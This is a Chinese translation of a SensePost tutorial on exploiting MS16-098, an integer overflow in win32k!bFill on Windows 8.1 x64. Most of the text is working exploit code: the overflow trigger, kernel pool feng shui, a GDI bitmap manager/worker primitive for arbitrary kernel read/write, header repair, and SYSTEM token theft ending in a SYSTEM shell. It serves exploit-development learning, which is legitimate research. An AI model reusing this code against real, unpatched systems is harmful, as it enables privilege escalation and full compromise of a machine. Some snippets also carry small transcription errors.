# 【技术分享】从MS16-098看Windows 8.1内核漏洞利用

阅读量 **196355**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2017-01-11 09:54:47

 **x**

##### 译文声明

本文是翻译文章，文章来源：sensepost.com

原文地址：<https://sensepost.com/blog/2017/exploiting-ms16-098-rgnobj-integer-overflow-on-windows-8.1-x64-bit-by-abusing-gdi-objects/>

译文仅供参考，具体内容表达以及含义原文为准。

****

****

**翻译：**[ **Ox9A82**
****](http://bobao.360.cn/member/contribute?uid=2676915949)

**预估稿费：300RMB**

******投稿方式：发送邮件至**[ **linwei#360.cn**](mailto:linwei@360.cn) **，或登陆**[
**网页版**](http://bobao.360.cn/contribute/index) **在线投稿******

**  
**

**前言**

在我刚开始接触内核漏洞时我没有任何有关内核的经验，更不用说去利用内核漏洞了，但我总是对于逆向工程和漏洞利用技术非常感兴趣。

最初，我的想法很简单：找到一个目前还没有可用exploit的可利用漏洞的补丁，从它开始我的逆向工程以及利用的旅途。这篇文章里谈及的漏洞不是我的最早选的那个：那个测试失败了。这实际上是我的第二选择，我花费了4个月的时间来了解有关这个漏洞的一切。

我希望这篇博客可以帮到那些渴望了解逆向工程和exploit开发的人。这是一个漫长的过程，而我又是一个内核exploit开发方面的新手，所以我希望你在阅读这篇文章时能够保持耐心。

  

**使用的工具**

Expand.exe (用于MSU文件）

Virtual KD <http://virtualkd.sysprogs.org/>(他们说自己比正常的内核调试要快上45倍是真的)

Windbg (kd)

IDA professional. <https://www.hex-rays.com/products/ida/>

Zynamics BinDiff IDA plugin. <https://www.zynamics.com/bindiff.html>

  

**Expand.exe的使用**

Expand.exe可以用来从微软更新文件（MSU）和CAB文件中提取文件。

使用以下命令更新和提取CAB文件到指定目录：

    
    
    Expand.exe -F:* [PATH TO MSU] [PATH TO EXTRACT TO] 
    Expand.exe -F:* [PATH TO EXTRACTED CAB] [PATH TO EXTRACT TO]

如果命令后面接地址，会根据符号定义的结构进行dump

!pool,!poolfind和!poolused命令在我分析内核池溢出，进行内核池风水时帮了我很多。

一些有用的例子：

要dump指定地址的内核池页面布局，我们可以使用以下命令：

    
    
    kd> !poolused [POOLTYPE] [POOLTAG]

要检索指定池类型中的指定池标记的对象的分配数量：

    
    
    kd> !poolused [POOLTYPE] [POOLTAG]

要为指定的池标记搜索提供的池类型的完整分配的内核池地址空间。

    
    
    kd> !poolfind [POOLTAG] [POOLTYPE]

  

**Windbg使用技巧**

相比其他调试器我个人更喜欢Windbg，因为它支持一些很有用的命令，特别是对于内核调试来说。

    
    
    kd> dt [OBJECT SYMBOL NAME] [ADDR]

dt命令使用符号表定义的结构来dump内存，这在分析对象时非常有用，并且可以在对象的符号已导出时了解一些特殊的情况。

使用这个命令时如果不加地址那么会直接显示这个对象的结构。例如，要查看EPROCESS对象的结构，我们可以使用以下命令。

  

**通过补丁对比来了解漏洞原理**

下载好更新文件，我们打开后发现被修改了的文件是win32k.sys，版本是6.3.9600.18405。当与其旧版本6.3.9600.17393进行二进制对比时，我们使用的是IDA的Zynamics
BinDiff插件。可以发现一个发生了更改的有趣函数的相似性评级是0.98。存在漏洞的函数是win32k！bFill。下面是两个版本之中的区别。

diff快速的展示出了一个整数溢出漏洞是如何通过加入一个UlongMult3函数来修补的，这个函数通过相乘来检测整数溢出。如果结果溢出了对象类型（即ULONG），则返回错误“INTSAFE_E_ARITHMETIC_OVERFLOW”。

这个函数被添加在调用PALLOCMEM2之前，PALLOCMEM2使用了一个经过检查的参数[rsp +
Size]。这确认了这个整数溢出将导致分配小尺寸的对象; 那么问题是——这个值可以被用户通过某种方式控制吗？

当面临一个复杂问题的时候，建议先将它分解为更小的问题。 因为内核漏洞利用是一个大问题，所以一步一步进行似乎是一种好方法。步骤如下：

1.击中存在漏洞的函数

2.控制分配的大小

3.内核内存池（pool）Feng Shui技术

4.利用GDI位图对象（Bitmap GDI objects）

5.分析并且控制溢出

6.修复溢出的头部

7.从SYSTEM进程的内核进程对象（EPROCESS）中偷取表示权限的Token

8.成功得到SYSTEM权限

**Step 1 –触发漏洞函数**

首先，我们需要了解如何通过查看IDA中的函数定义来击中漏洞函数。可以看出，该函数在EPATHOBJ上起作用，并且函数名“bFill”说明它与填充路径有关。通过用谷歌搜索“msdn路径填充”，我得到了BeginPath函数和示例程序。

    
    
    bFill@(struct EPATHOBJ *@, struct _RECTL *@, unsigned __int32@, void (__stdcall *)(struct _RECTL *, unsigned __int32, void *)@, void *)

理论上来说，如果我们使用示例中的代码，它应该会击中漏洞函数？

    
    
    // Get Device context of desktop hwnd
    hdc = GetDC(NULL); 
    //begin the drawing path
    BeginPath(hdc); 
    // draw a line between the supplied points.
    LineTo(hdc, nXStart + ((int) (flRadius * aflCos[i])), nYStart + ((int) (flRadius * aflSin[i]))); 
    //End the path
    EndPath(hdc);
    //Fill Path
    FillPath(hdc);

好吧，这没有实现。所以我在windbg中对每个函数的起始部分都添加了一个断点。

    
    
    EngFastFill() -> bPaintPath() -> bEngFastFillEnum() -> Bfill()

再次运行示例代码，发现第一个函数被命中，然后不再继续命中最后的函数是EngFastFill。为了不让深入的逆向分析过程给读者增加无聊的细节，我们这里直接给出结论。简而言之，这个函数是一个switch
case结构，将最终会调用bPaintPath，bBrushPath或bBrushPathN_8x8。到底调用哪个则取决于一个画刷对象（brush
object）关联的hdc。上面的代码甚至没有执行到switch case，它在之前就失败了。我发现有四种设备上下文类型

打印机

显示，它是默认值

信息

内存，它支持对位图对象的绘制操作。

根据提供的信息，我尝试将设备类型转换为内存（位图）如下：

    
    
    // Get Device context of desktop hwnd
    HDC hdc = GetDC(NULL);
    // Get a compatible Device Context to assign Bitmap to
    HDC hMemDC = CreateCompatibleDC(hdc);
    // Create Bitmap Object
    HGDIOBJ bitmap = CreateBitmap(0x5a, 0x1f, 1, 32, NULL);
    // Select the Bitmap into the Compatible DC
    HGDIOBJ bitobj = (HGDIOBJ)SelectObject(hMemDC, bitmap);
    //Begin path
    BeginPath(hMemDC);
    // draw a line between the supplied points.
    LineTo(hdc, nXStart + ((int) (flRadius * aflCos[i])), nYStart + ((int) (flRadius * aflSin[i])));         
    // End the path
    EndPath(hMemDC);
    // Fill the path
    FillPath(hMemDC);

事实证明，这正是击中漏洞函数bFill所需要做的。

**Step 2 – Controlling the Allocation Size:**

来看看分配部分的代码

在调用分配函数之前，首先检查[rbx +
4]（rbx是我们的第一个参数，即EPATHOBJ）的值是否大于0x14.如果大于，则这个值被乘以3就是这里导致的整数溢出。

    
    
    lea ecx, [rax+rax*2];

溢出发生实际上有两个原因：一是这个值被转换到32位寄存器ecx中和二是[rax + rax *
2]意味着值被乘以3。通过一些计算，我们可以得出结论，要溢出这个函数的值需要是：

    
    
    0xFFFFFFFF / 3 = 0x55555555

任何大于上面的值都可以溢出32位的寄存器。

    
    
    0x55555556 * 3 = 0x100000002

然后，做完乘法的结果又向左移了4位，一般左移4位被认为等同于乘以2 ^ 4。

    
    
    0x100000002 << 4 | 0x100000002 * 2^4) = 0x00000020 (32位寄存器值)

目前为止，仍然没有结论如何去控制这个值，所以我决定阅读更多关于使用PATH对象进行Windows
GDI利用的帖子，看看有没有什么思路。我很巧合的看到了一篇博文，讨论的是MS16-039的利用过程。这篇博文中讨论的漏洞与我们当前攻击的目标函数拥有相同的代码，就好像有人在这两个函数中复制粘贴代码一样。如果没有这篇博客，那么我会花费更多的时间在这上面，所以非常感谢你，NicoEconomou。

但是，人们会想当然的认为，可以直接从里面拿到一个伟大的指南，但实际上根本不是这样。虽然这篇文章真的很有助于利用思路。但真正的价值是，对于一对不同的利用，和我这样一个根本没有内核开发和内核利用经验的人，我不得不深入到利用过程中的每个方面，并了解它的工作原理。就是说——“授人以鱼不如授人以渔”

我们继续，那个值是PATH对象中的point数，并且可以通过多次调用PolylineTo函数来控制。触发50字节分配的代码是：

    
    
    //Create a Point array 
    static POINT points[0x3fe01];
    // Get Device context of desktop hwnd
    HDC hdc = GetDC(NULL);
    // Get a compatible Device Context to assign Bitmap to
    HDC hMemDC = CreateCompatibleDC(hdc);
    // Create Bitmap Object
    HGDIOBJ bitmap = CreateBitmap(0x5a, 0x1f, 1, 32, NULL);
    // Select the Bitmap into the Compatible DC
    HGDIOBJ bitobj = (HGDIOBJ)SelectObject(hMemDC, bitmap);
    //Begin path
    BeginPath(hMemDC);
    // Calling PolylineTo 0x156 times with PolylineTo points of size 0x3fe01.
    for (int j = 0; j < 0x156; j++) {
        PolylineTo(hMemDC, points, 0x3FE01);
        }
    }
    // End the path
    EndPath(hMemDC);
    // Fill the path
    FillPath(hMemDC);

通过以point数0x3FE01调用PolylineTo函数0x156次将产生

    
    
    0x156 * 0x3FE01 = 0x5555556

注意，这个数字小于前面计算产生的数字，原因是实际中当该位左移4位时，最低的半字节将被移出32位寄存器，而剩下的是小数。另一件值得一提的是，应用程序将向point列表中添加一个额外的point，因此传递给溢出指令的数字将为0x5555557。让我们计算一下，看看它会如何工作。

    
    
    0x5555557 * 0x3 = 0x10000005 
    0x10000005 << 4 = 0x00000050

到那时候，将会分配50字节大小，应用程序将尝试复制0x5555557大小的数据到那一小块内存，这将迅速导致一个蓝屏，并且我们成功的触发了漏洞！

**Step 3 – 内核内存池Feng Shui:**

现在开始困难的部分：内核池风水

内核池风水是一种用于控制内存布局的技术，通过分配和释放内存的调用在目标对象分配之前，先使内存处于确定的状态。这种想法是想要强制我们的目标对象分配在我们可控对象的附近，然后溢出相邻的对象并使用发生溢出的对象来利用内存破坏原语（译注：所谓的“内存破坏原语”，指的应该是一些可以被利用的指令，比如mov
[eax],xxx 可以进行写），获得读/写内核内存的能力。我选择的对象是Bitmap，具有池标签Gh05（pool
tag），他会被分配给相同的页会话池，并且可以使用SetBitmapBits/GetBitmapBits来控制写/读到任意位置。

发生崩溃是因为在bFill函数结束时，会释放分配的对象，当对象被释放时，内核会验证内存池中相邻块的块头部。如果它被损坏，将抛出错误BAD_POOL_HEADER并退出。由于我们溢出了相邻的页面，所以这个检查将会失败，并且会发生蓝屏。

避开这个检查导致的崩溃的窍门是强制我们的对象分配在内存页的结尾。这样，将不会有下一个块，并且对free（）的调用将正常传递。要实现这个FengShui需要记住以下几点：

内核池页面大小为0x1000字节，任何更大的分配将分配到大内核池（Large kernel Pool）。

任何大于0x808字节的分配都会被分配到内存页的开始。

后续分配将从内存页末尾开始分配。

分配需要相同的池类型，在我们的情况下是分页会话池（Paged）。

分配对象通常会添加大小为0x10的池头。 如果分配的对象是0x50，分配器将实际分配0x60，包括池头。

有了这些，就可以开发内核池风水了，来看看这将如何工作，看看漏洞代码：

    
    
    void fungshuei() {
        HBITMAP bmp;
        // Allocating 5000 Bitmaps of size 0xf80 leaving 0x80 space at end of page.
        for (int k = 0; k < 5000; k++) {
            bmp = CreateBitmap(1670, 2, 1, 8, NULL); // 1670  = 0xf80 1685 = 0xf90 allocation size 0xfa0
            bitmaps[k] = bmp;
        }
        HACCEL hAccel, hAccel2;
        LPACCEL lpAccel;
        // Initial setup for pool fengshui.  
        lpAccel = (LPACCEL)malloc(sizeof(ACCEL));
        SecureZeroMemory(lpAccel, sizeof(ACCEL));
        // Allocating  7000 accelerator tables of size 0x40 0x40 *2 = 0x80 filling in the space at end of page.
        HACCEL *pAccels = (HACCEL *)malloc(sizeof(HACCEL) * 7000);
        HACCEL *pAccels2 = (HACCEL *)malloc(sizeof(HACCEL) * 7000);
        for (INT i = 0; i < 7000; i++) {
            hAccel = CreateAcceleratorTableA(lpAccel, 1);
            hAccel2 = CreateAcceleratorTableW(lpAccel, 1);
            pAccels[i] = hAccel;
            pAccels2[i] = hAccel2;
        }
        // Delete the allocated bitmaps to free space at beginning of pages
    for (int k = 0; k < 5000; k++) {
            DeleteObject(bitmaps[k]);
        }
        //allocate Gh04 5000 region objects of size 0xbc0 which will reuse the free-ed bitmaps memory.
        for (int k = 0; k < 5000; k++) {
            CreateEllipticRgn(0x79, 0x79, 1, 1); //size = 0xbc0
        }
        // Allocate Gh05 5000 bitmaps which would be adjacent to the Gh04 objects previously allocated
        for (int k = 0; k < 5000; k++) {
            bmp = CreateBitmap(0x52, 1, 1, 32, NULL); //size  = 3c0
            bitmaps[k] = bmp;
        }
        // Allocate 1700 clipboard objects of size 0x60 to fill any free memory locations of size 0x60
        for (int k = 0; k < 1700; k++) { //1500
            AllocateClipBoard2(0x30);
        }
        // delete 2000 of the allocated accelerator tables to make holes at the end of the page in our spray.
        for (int k = 2000; k < 4000; k++) {
            DestroyAcceleratorTable(pAccels[k]);
            DestroyAcceleratorTable(pAccels2[k]);
        }
    }

可以清楚地看到分配/解除分配的流量，GIF值得一千字

通过分配/释放调用，显示实际发生的事情，内核风水的第一步是：

    
    
    HBITMAP bmp;
            // Allocating 5000 Bitmaps of size 0xf80 leaving 0x80 space at end of page.
            for (int k = 0; k < 5000; k++) {
                    bmp = CreateBitmap(1670, 2, 1, 8, NULL); 
                    bitmaps[k] = bmp;
            }

从5000个大小为0xf80的Bitmap对象的分配开始。这将最终开始分配新的内存页面，每个页面将以大小为0xf80的Bitmap对象开始，并在页面结尾留下0x80字节的空间。如果想要检查喷射是否工作，我们可以在bFill内调用PALLOCMEM，并使用poolused
0x8
Gh?5来查看分配了多少个位图对象。另一件事是，如何计算提供给CreateBitmap()函数的大小转换为由内核分配的Bitmap对象。其实这只是一个近似的计算，需要不断的尝试和纠错，通过不断的更改位图的大小，并使用poolfind命令查看分配的大小进行修正。

    
    
     // Allocating 7000 accelerator tables of size 0x40 0x40 *2 = 0x80 filling in the space at end of page.
            HACCEL *pAccels = (HACCEL *)malloc(sizeof(HACCEL) * 7000);
            HACCEL *pAccels2 = (HACCEL *)malloc(sizeof(HACCEL) * 7000);
            for (INT i = 0; i < 7000; i++) {
                    hAccel = CreateAcceleratorTableA(lpAccel, 1);
                    hAccel2 = CreateAcceleratorTableW(lpAccel, 1);
                    pAccels[i] = hAccel;
                    pAccels2[i] = hAccel2;
            }

然后，分配7000个加速器表对象（Usac）。每个Usac的大小为0x40，因此其中有两个将分配到剩下的0x80字节的内存中。这将填充前面的分配轮次的剩余0x80字节，并完全填充我们的页面（0xf80
+ 80 = 0x1000）。

    
    
     // Delete the allocated bitmaps to free space at beginning of pages
            for (int k = 0; k < 5000; k++) {
                    DeleteObject(bitmaps[k]);
            }

下一次分配以前分配的对象将保留有我们的内存页布局，在页的开头有0xf80个空闲字节。

    
    
    //allocate Gh04 5000 region objects of size 0xbc0 which will reuse the free-ed bitmaps memory.
            for (int k = 0; k < 5000; k++) {
                    CreateEllipticRgn(0x79, 0x79, 1, 1); //size = 0xbc0
            }

分配5000个大小为0xbc0字节的区域对象（Gh04）。这个大小是必要的，因为如果Bitmap对象直接放置在我们的目标对象附近，溢出它就覆盖不到Bitmap对象中的我们目标的成员（在后面部分讨论），而我们需要溢出这个目标成员配合GetBitmapBits/SetBitmapBits来读/写内核内存。至于如何计算分配的对象的大小与提供给CreateEllipticRgn函数的参数相关，需要通过不断的尝试和修正来找到的。

对于feng shui来说，内核页面在页的开头有0xbc0大小的Gh04对象，在页的结尾有0x80字节。它们之中有0x3c0个字节的空闲空间。

    
    
    // Allocate Gh05 5000 bitmaps which would be adjacent to the Gh04 objects previously allocated
            for (int k = 0; k < 5000; k++) {
                    bmp = CreateBitmap(0x52, 1, 1, 32, NULL); //size  = 3c0
                    bitmaps[k] = bmp;
            }

分配大小5000个大小为0x3c0字节的位图对象来填充被释放的内存，位图对象是我们溢出的目标。

    
    
    // Allocate 1700 clipboard objects of size 0x60 to fill any free memory locations of size 0x60
            for (int k = 0; k < 1700; k++) { //1500
                    AllocateClipBoard2(0x30);
            }

下一步是分配1700个大小为0x60的剪贴板对象（Uscb），这只是为了在分配我们的模板对象之前填充掉大小为0x60的任何内存。这样一来当对象被分配时，它几乎肯定会落入我们的内存布局之中。Nicolas使用这个对象进行了内核喷射，我没有试图模拟free或者syscall来做到这一点，然而发现了一些比较古怪的行为，基本上是使用下面的代码将东西复制到剪贴板：

    
    
    void AllocateClipBoard(unsigned int size) {
        BYTE *buffer;
        buffer = malloc(size);
        memset(buffer, 0x41, size);
        buffer[size-1] = 0x00;
        const size_t len = size;
        HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);
        memcpy(GlobalLock(hMem), buffer, len);
        GlobalUnlock(hMem);
        OpenClipboard(wnd);
        EmptyClipboard();
        SetClipboardData(CF_TEXT, hMem);
        CloseClipboard();
            GlobalFree(hMem);
    }

我发现，如果你省略掉OpenCliboard，CloseClipBboard和EmptyClipboard直接调用SetClipboardData，那么这个对象会被分配，并且永远不会被释放。我猜你多次调用后会发生内存耗尽，但我并没有进行测试。此外，我所说的对象不能被释放，是指即使你使用EmptyCliBoard打开和清空剪贴板，或者连续调用SetBitmapData和EmptyClipboad也不行。

    
    
     // delete 2000 of the allocated accelerator tables to make holes at the end of the page in our spray.
            for (int k = 2000; k < 4000; k++) {
                    DestroyAcceleratorTable(pAccels[k]);
                    DestroyAcceleratorTable(pAccels2[k]);
            }

我们的内核FengShui的最后一步就是在分配的加速器表对象（Usac）中打孔，正好创建2000个孔。内核风水函数也是在漏洞被触发之前就要被调用的，如果一切顺利的话我们的目标对象将被分配到这些孔中的一个，其位置在内存页的末尾。

**Step 4 – 利用Bitmap位图对象:**

位图对象的结构以SURFOBJ64作为起始，后面接着的是位图数据，这个对象有三个我们感兴趣的成员，sizlBitmap，pvScan0和hdev。sizlBitmap是位图的宽度和高度，pvScan0是指向位图数据开始的指针，hdev是指向设备句柄的指针。

    
    
    typedef struct {
      ULONG64 dhsurf; // 0x00
      ULONG64 hsurf; // 0x08
      ULONG64 dhpdev; // 0x10
      ULONG64 hdev; // 0x18
      SIZEL sizlBitmap; // 0x20
      ULONG64 cjBits; // 0x28
      ULONG64 pvBits; // 0x30
      ULONG64 pvScan0; // 0x38
      ULONG32 lDelta; // 0x40
      ULONG32 iUniq; // 0x44
      ULONG32 iBitmapFormat; // 0x48
      USHORT iType; // 0x4C
      USHORT fjBitmap; // 0x4E
    } SURFOBJ64; // sizeof = 0x50

我们利用位图对象的方式是通过使用受控值来覆盖sizlBitmap或pvScan0。SetBitmapBits/
GetBitmapBits要验证读写的数据量，就是使用的这两个对象成员，它表示了位图可用数据的大小。例如，GetBitmapBits会计算位图的宽度x高度x4（每像素每个字节32位，作为CreateBitmap的参数），来验证从pvScan0指向的地址可以读取的数据量。

如果sizlBitmap的成员被更大的宽度和高度值覆盖，那么它将可以扩大位图以读取和写入数据。在这个漏洞中，例如，它是宽度0xFFFFFFFF×高度1×4。

如果溢出的数据可控，那么我们可以直接使用我们想要读写的地址来设置pvScan0成员的值。

将第一个位图的pvScan0设置为第二个位图的pvScan0的地址。

使用第一个位图作为管理器，将第二个位图的pvScan0指针设置为指向我们要读写的地址。

这样，第二个位图实际上就可以读写这个地址了。

对这个漏洞来说，用于溢出堆的数据不是完全可控的，因为被复制的数据是大小为0x30字节的point或更特定的边缘对象。幸运的是，如下一节所示，被重写的一些数据可以被间接控制，并且将用值0x1和0xFFFFFFFF覆盖掉sizlBitmap成员，这会扩大位图对象可以读写的数据量。使用的流程如下。

1.触发溢出并覆盖相邻位图对象的sizlBitmap成员。

2.使用扩展位图作为管理器覆盖第二个位图的pvScan0成员。

3.使第二个位图作为工作者，利用它读写由第一个位图设置的地址。

hdev成员的重要性将在下一节中详细讨论，主要是它要么会设置为0要么就设置为指向设备对象的指针。

**Step 5 – 分析并控制溢出数据:**

现在该分析如何控制溢出了，为了更好地理解它，我们需要看看addEdgeToGet函数，这个函数将point复制到新分配的内存中。刚开始时，addEdgeToGet将r11和r10寄存器的值设置为[r9+4]和[r8+4]。

然后会进行检查，检查上一个point.y是否小于[r9 +
0c]，而这里是0x1f0。如果是这种情况的话，当前point会被复制到我们的缓冲区中，如果不是则跳过当前point。还需要注意的是point.y的值向左移动了一些，例如如果前面的point.y
= 0x20，则值将为0x200。

现在我们有了控制溢出的原语，我们还需要找出值0x1和0xFFFFFFFF是怎么被复制的。

在第一次检查中，函数将从表示当前point.y值的ebp寄存器中减去r10中的前一个point.y值。如果得到的结果是unsigned（译注：js跳转），它会将0xFFFFFFFF复制到rdx指向的缓冲区偏移0x28处。我们这里猜测，这个函数是在检查当前point.y到前一个point.y的方向。

在第二次检查中，对point.x也一样，从表示当前point.x的ebx上减去表示上一个point.x的r8，如果结果是无符号的，函数将复制0x1到我们r15指向的缓冲区的0x24偏移处。这个操作很有意义，因为它对应于上一个检查时复制数据到0x28偏移处，而且我们的目的只是想溢出sizlBitmap结构。对于大小为0x30字节的point结构，也会把1复制到由[r15
+ 0x24]指向的对象的hdev成员中。

计算point的数量来溢出缓冲区以覆盖sizLBitmap成员是比较容易的，并且该漏洞exploit的执行方式是简单地将上一个point.y值篡改为更大的值。但是这将使前面提到的那些检查失败，从而使得这些point不会被复制。来看一下exploit中的代码片段。

    
    
    static POINT points[0x3fe01];
    for (int l = 0; l < 0x3FE00; l++) {
        points[l].x = 0x5a1f;
        points[l].y = 0x5a1f;
    }
    points[2].y = 20; //0x14 < 0x1f
    points[0x3FE00].x = 0x4a1f;
    points[0x3FE00].y = 0x6a1f;

这就是最初的point数组被初始化的过程，注意points[2].y的值设置为20，即十六进制中的0x14，小于0x1f，因此将复制后续的points到我们分配的缓冲区中。

    
    
    for (int j = 0; j < 0x156; j++) { if (j > 0x1F && points[2].y != 0x5a1f) {
            points[2].y = 0x5a1f;
        }
        if (!PolylineTo(hMemDC, points, 0x3FE01)) {
            fprintf(stderr, "[!] PolylineTo() Failed: %xrn", GetLastError());
        }
    }

然后，一个验证被添加到调用PolyLineTo的循环中，以检查循环次数是否大于0x1F，如果大于就将points
[2].y的值更改为大于0x1F0的值，从而使检查失败，由此后续的point不会再被复制到我们的缓冲区中。

这样可以有效地控制溢出，函数会溢出缓冲区直到下一个相邻的位图对象的sizlBitmap成员为0x1和0xFFFFFFFF。这有效的增大了位图对象，允许我们对这个位图对象进行越界读写。找到到底是哪个位图对象的方法是通过循环调用GetBitmapBits函数，如果得到的大小大于从我们的内核池喷出的位图的原始值则该位图是被溢出的，那么它是管理器位图，并且相邻的下一个是工作者位图。

    
    
    for (int k=0; k < 5000; k++) { res = GetBitmapBits(bitmaps[k], 0x1000, bits); if (res > 0x150) // if check succeeds we found our bitmap.
    }

如果一切都能按计划进行，我们就应该能够从内存中读取0x1000 bit。 下面有位图对象在溢出前后，标题，sizLBitmap和hdev成员溢出。

下面是一个位图对象在溢出前后的成员的值

当循环检测是哪个位图被执行时，会在几次调用GetBitmapBits之后发生崩溃。崩溃发生在PDEVOBJ::
bAlowSharedAcces函数中，当试图从地址0x0000000100000000（它是上面重写的位图对象的hdev成员）读取时。在分析时注意到位图对象有一个成员要么是NULL要么是指向的Gdev设备对象的指针，在这种情况下这个成员是指向设备对象的指针。

函数win32k!GreGetBitmapBits会调用NEEDGRELOCK::vLock，而这个函数会接着调用PDEVOBJ::bAllowSharedAccess。通过观察NEEDGRELOCK::vLock函数的反汇编，可以注意到这个函数使用PDEVOBJ只是为了调用PDEVOBJ::bAllowSharedAccess，如果这个函数的返回值为零，那么它将继续进行其他的检查，此后就没有再使用过PDEVOBJ了。

此外，在GreGetBitmapBits中，函数不检查NEEDGRELOCK::vlock的返回值，执行后，PDEVOBJ::
bAllowSharedAccess将尝试读取第一个功能块中的地址，如果读到的数据等于1，那么这个函数将以0值退出，而这是继续执行所要求的。

使用VirtualAlloc为此地址分配内存并将所有的字节都设置为1，将会无错误的退出函数。并且会回收GetBitmapBits使用的位图数据，整个过程不会发生崩溃。

    
    
    VOID *fake = VirtualAlloc(0x0000000100000000, 0x100, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memset(fake, 0x1, 0x100);

**Step 6 – 修复被溢出的头部:**

在这一点上，exploit能够读写大小为0xFFFFFFFF * 1 *
4的相邻内存，这足以到达下一页中的第二个相邻位图对象，并覆盖要用于在内核内存上进行任意读写的pvScan0地址。

当exploit退出时，我注意到有时在进程退出时会发生一些与池头有关的崩溃。解决这个问题的方案是使用GetBitmapbits，读取下一个区域（region）和位图对象的头，这些对象没有被覆盖，然后泄露一个可以在region对象中找到的内核地址，

计算被溢出覆盖的区域（region）对象的地址的方法是将泄漏出来的地址的最低字节置为空，这将提供给我们当前页的开始的地址，然后将倒数第二个低字节减去0x10，从当前页的起始减去0x1000，就可以得到前一页的开始地址。

    
    
    addr1[0x0] = 0;
    int u = addr1[0x1];
    u = u - 0x10;
    addr1[1] = u;

接下来要计算溢出的Bitmap对象的地址，记住region对象的大小为0xbc0，因此将在最后一步得到的地址的最低字节设置为0xc0，并将0xb加给倒数第二个最低字节，将获得发生溢出的位图对象的头部地址。

    
    
    ddr1[0] = 0xc0;
    int y = addr1[1];
    y = y + 0xb;
    addr1[1] = y;

然后，管理器（manager）位图对象通过SetBitmapBits覆写工作者位图对象的pvScan0成员为区域头的地址（region
header）。然后，工作者（worker）位图被SetBitmapBits用来设置该地址指向的数据为在第一步骤中读取的头部数据。对于溢出的位图对象头也是这样。

    
    
    void SetAddress(BYTE* address) {
        for (int i = 0; i < sizeof(address); i++) {
            bits[0xdf0 + i] = address[i];
        }
        SetBitmapBits(hManager, 0x1000, bits);
    }
    void WriteToAddress(BYTE* data) {
        SetBitmapBits(hWorker, sizeof(data), data);
    }
    SetAddress(addr1);
    WriteToAddress(Gh05);

**Step 7 – 从EPROCESS对象中偷取Token:**

这个过程起始于获取PsInitialSystemProcess全局变量的内核地址，这个指针指向EPROCESS列表中的第一个条目，该指针由ntoskrnl.exe导出。

    
    
    // Get base of ntoskrnl.exe
    ULONG64 GetNTOsBase()
    {
        ULONG64 Bases[0x1000];
        DWORD needed = 0;
        ULONG64 krnlbase = 0;
        if (EnumDeviceDrivers((LPVOID *)&Bases, sizeof(Bases), &needed)) {
            krnlbase = Bases[0];
        }
        return krnlbase;
    }
    // Get EPROCESS for System process
    ULONG64 PsInitialSystemProcess()
    {
        // load ntoskrnl.exe
        ULONG64 ntos = (ULONG64)LoadLibrary("ntoskrnl.exe");
        // get address of exported PsInitialSystemProcess variable
        ULONG64 addr = (ULONG64)GetProcAddress((HMODULE)ntos, "PsInitialSystemProcess");
        FreeLibrary((HMODULE)ntos);
        ULONG64 res = 0;
        ULONG64 ntOsBase = GetNTOsBase();
        // subtract addr from ntos to get PsInitialSystemProcess offset from base
        if (ntOsBase) {
            ReadFromAddress(addr - ntos + ntOsBase, (BYTE *)&res, sizeof(ULONG64));
        }
        return res;
    }

PsInitalSystemProcess（译注：作者起一样的名字不怕歧义？这里指的是上面代码中的函数）会把ntoskrnl.exe加载到内存中，并使用GetProcAddress获取导出的PsInitialSystemProcess的地址，然后使用EnumDeviceDrivers()函数获取内核基址。把PsInitialSystemProcess的值减去内核加载基址，就可以得到一个偏移量，将此偏移量加到检索到的内核基址上就可以得到PsInitialSystemProcess指针的内核地址。

    
    
    LONG64 PsGetCurrentProcess()
    {
        ULONG64 pEPROCESS = PsInitialSystemProcess();// get System EPROCESS
         // walk ActiveProcessLinks until we find our Pid
        LIST_ENTRY ActiveProcessLinks;
        ReadFromAddress(pEPROCESS + gConfig.UniqueProcessIdOffset + sizeof(ULONG64), (BYTE *)&ActiveProcessLinks, sizeof(LIST_ENTRY));
        ULONG64 res = 0;
        while (TRUE) {
            ULONG64 UniqueProcessId = 0;
            // adjust EPROCESS pointer for next entry
            pEPROCESS = (ULONG64)(ActiveProcessLinks.Flink) - gConfig.UniqueProcessIdOffset - sizeof(ULONG64);
            // get pid
            ReadFromAddress(pEPROCESS + gConfig.UniqueProcessIdOffset, (BYTE *)&UniqueProcessId, sizeof(ULONG64));
            // is this our pid?
            if (GetCurrentProcessId() == UniqueProcessId) {
                res = pEPROCESS;
                break;
            }
            // get next entry
            ReadFromAddress(pEPROCESS + gConfig.UniqueProcessIdOffset + sizeof(ULONG64), (BYTE *)&ActiveProcessLinks, sizeof(LIST_ENTRY));
            // if next same as last, we reached the end
            if (pEPROCESS == (ULONG64)(ActiveProcessLinks.Flink) - gConfig.UniqueProcessIdOffset - sizeof(ULONG64))
                break;
        }
        return res;
    }

然后，它将使用管理器（manager）和工作者（worker）位图来遍历EPROCESS列表，查找列表中的当前进程。找到之后，会通过位图从EPROCESS列表中的第一个条目读取SYSTEM的Token，在EPROCESS列表中写入当前的进程。

    
    
    // get System EPROCESS
    ULONG64 SystemEPROCESS = PsInitialSystemProcess();
    //fprintf(stdout, "rn%xrn", SystemEPROCESS);
    ULONG64 CurrentEPROCESS = PsGetCurrentProcess();
    //fprintf(stdout, "rn%xrn", CurrentEPROCESS);
    ULONG64 SystemToken = 0;
    // read token from system process
    ReadFromAddress(SystemEPROCESS + gConfig.TokenOffset, (BYTE *)&SystemToken, 0x8);
    // write token to current process
    ULONG64 CurProccessAddr = CurrentEPROCESS + gConfig.TokenOffset;
    SetAddress((BYTE *)&CurProccessAddr);
    WriteToAddress((BYTE *)&SystemToken);
    // Done and done. We're System :)

**Step 8 – SYSTEM !!**

现在，当前的进程就拥有了SYSTEM令牌，并且会以SYSTEM权限执行。

    
    
    system("cmd.exe");

本文示例的下载地址：<https://gitlab.sensepost.com/saif/MS16-098_RNGOBJ_Integer_Overflow>

  

**References**

[1] <https://www.coresecurity.com/blog/ms16-039-windows-10-64-bits-integer-overflow-exploitation-by-using-gdi-objects2>

[2] <https://www.coresecurity.com/blog/abusing-gdi-for-ring0-exploit-primitives>

[3] <https://msdn.microsoft.com/en-us/library/windows/desktop/bb776657(v=vs.85).aspx>

[4] <http://www.zerodayinitiative.com/advisories/ZDI-16-449/>

[5] Using Paths Example: <https://msdn.microsoft.com/en-us/library/windows/desktop/dd145181(v=vs.85).aspx>

